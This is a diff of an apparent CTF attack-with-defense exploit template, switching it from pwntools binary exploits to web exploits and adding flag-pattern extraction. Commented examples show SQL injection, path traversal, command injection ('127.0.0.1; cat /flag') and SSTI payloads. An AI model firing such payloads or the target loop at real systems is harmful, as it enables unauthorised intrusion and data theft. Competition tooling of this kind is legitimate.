@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-AWD Exploit Template
-====================
-Copy this file and modify the exploit() function for each challenge.
+AWD Web Exploit Template
+========================
+Copy this file and modify the exploit() function for each web challenge.
 
 Usage:
     python3 my_exploit.py              # Run against all targets
@@ -12,22 +12,18 @@ Usage:
 """
 
 import sys
-import os
+import re
 import time
+import requests
 
-# Suppress pwntools noise (must be before import)
-os.environ['PWNLIB_NOTERM'] = '1'
-
-from pwn import *
 from awd_lib import (
     chal, submit, targets, our_ip, discord,
     setup_auth, ssh_command, print_info, print_targets,
-    PEM_FILE
 )
 
 # === CHALLENGE CONFIG ===
-PORT = 9999           # Change this per challenge
-TIMEOUT = 10          # Connection timeout
+PORT = 8080           # Change this per challenge
+TIMEOUT = 10          # Request timeout
 LOOP_DELAY = 60       # Seconds between rounds (for --loop)
 
 # Configure challenge (uncomment and edit as needed)
@@ -37,10 +33,6 @@ LOOP_DELAY = 60       # Seconds between rounds (for --loop)
 #     discord_host="192.168.1.100",
 #     discord_port=4545,
 # )
-
-# Suppress pwntools output
-context.log_level = 'error'
-context.timeout = TIMEOUT
 
 # ========================
 # YOUR EXPLOIT CODE HERE
@@ -58,30 +50,56 @@ def exploit(ip, port):
         Flag string if successful, None otherwise
     """
     try:
-        p = remote(ip, port, timeout=TIMEOUT)
+        base_url = f"http://{ip}:{port}"
+        session = requests.Session()
+        session.timeout = TIMEOUT
         
         # === YOUR EXPLOIT LOGIC HERE ===
         
-        # Example: simple backdoor
-        # p.recvuntil(b"> ")
-        # p.sendline(b"cat flag")
-        # flag = p.recvline().strip()
+        # Example: SQL injection
+        # r = session.get(f"{base_url}/api/user?id=' UNION SELECT flag FROM flags--")
+        # flag = extract_flag(r.text)
         
-        # Example: buffer overflow
-        # payload = b"A" * 64 + p64(win_addr)
-        # p.sendline(payload)
-        # p.recvuntil(b"flag{")
-        # flag = b"flag{" + p.recvuntil(b"}")
+        # Example: LFI
+        # r = session.get(f"{base_url}/read?file=../../../flag.txt")
+        # flag = extract_flag(r.text)
+        
+        # Example: Command injection
+        # r = session.post(f"{base_url}/ping", data={"host": "127.0.0.1; cat /flag"})
+        # flag = extract_flag(r.text)
+        
+        # Example: SSTI
+        # r = session.get(f"{base_url}/hello?name={{{{config.FLAG}}}}")
+        # flag = extract_flag(r.text)
         
         # Placeholder - replace with your exploit
         flag = None
         
-        p.close()
         return flag
         
     except Exception as e:
         # discord.error(f"Exploit failed on {ip}", exc=e)  # Optional
         return None
+
+
+def extract_flag(text):
+    """
+    Extract flag from response text.
+    Modify the pattern to match your CTF's flag format.
+    """
+    # Common flag patterns - adjust as needed
+    patterns = [
+        r'hkcert\d{2}\{[^}]+\}',  # hkcert24{...}
+        r'flag\{[^}]+\}',         # flag{...}
+        r'FLAG\{[^}]+\}',         # FLAG{...}
+        r'CTF\{[^}]+\}',          # CTF{...}
+    ]
+    
+    for pattern in patterns:
+        match = re.search(pattern, text)
+        if match:
+            return match.group(0)
+    return None
 
 
 # ========================
@@ -112,10 +130,9 @@ def run_single(ip):
 
 def run_all():
     """Run exploit against all targets."""
-    target_list = targets()
-    my_ip = our_ip()
+    target_list = targets()  # Already excludes our IP
     
-    print(f"[*] Our IP: {my_ip}")
+    print(f"[*] Our IP: {our_ip()}")
     print(f"[*] Targets: {len(target_list)}")
     print(f"[*] Port: {PORT}")
     print()
@@ -126,10 +143,6 @@ def run_all():
     failed = 0
     
     for ip in target_list:
-        # Skip our own IP
-        if ip == my_ip:
-            continue
-            
         if run_single(ip):
             success += 1
         else:
